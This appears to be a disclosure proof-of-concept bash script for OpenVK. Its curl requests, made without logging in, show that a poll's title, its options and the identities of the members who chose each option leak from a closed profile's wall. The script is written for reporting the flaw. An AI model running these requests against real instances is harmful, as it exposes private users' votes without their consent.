#!/usr/bin/env bash
# OVK-02 - Unauthenticated poll disclosure bypassing the parent wall's privacy.
# Setup: a member publishes a NON-anonymous poll on a CLOSED profile's wall.
# All requests below are made logged-out (no cookies).
H="http://<OPENVK_HOST>"
N="<POLL_ID>"      # sequential integer, e.g. 2

# Controls: the wall and the post are hidden from guests
curl -si "$H/wall<N>"        # -> 302 redirect to /
curl -si "$H/wall<N>_<N>"    # -> 404

# Leaks: poll title + all options
curl -si "$H/poll$N"

# Leaks: per-option voter identities (option param = base-32 of the numeric option id)
curl -si "$H/poll$N/voters?option=<OPTION_ID_BASE32_1>"
curl -si "$H/poll$N/voters?option=<OPTION_ID_BASE32_2>"
# -> 200 pages listing which member chose each option
